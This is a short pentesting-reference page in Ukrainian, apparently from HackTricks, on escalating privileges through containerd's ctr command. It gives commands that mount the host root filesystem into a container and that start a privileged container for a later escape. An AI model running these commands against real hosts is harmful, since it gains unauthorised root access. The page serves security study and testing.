# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація

Перейдіть за наступним посиланням, щоб дізнатися **що таке containerd** та `ctr`:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE 1

якщо ви виявите, що хост містить команду `ctr`:
```bash
which ctr
/usr/bin/ctr
```
Ви можете перерахувати зображення:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
А потім **запустіть один з цих образів, змонтувавши кореневу папку хоста до нього**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Запустіть контейнер з привілеями та втечіть з нього.\
Ви можете запустити контейнер з привілеями так:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Тоді ви можете використовувати деякі з технік, згаданих на наступній сторінці, щоб **втекти з нього, зловживаючи привілейованими можливостями**:

{{#ref}}
docker-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
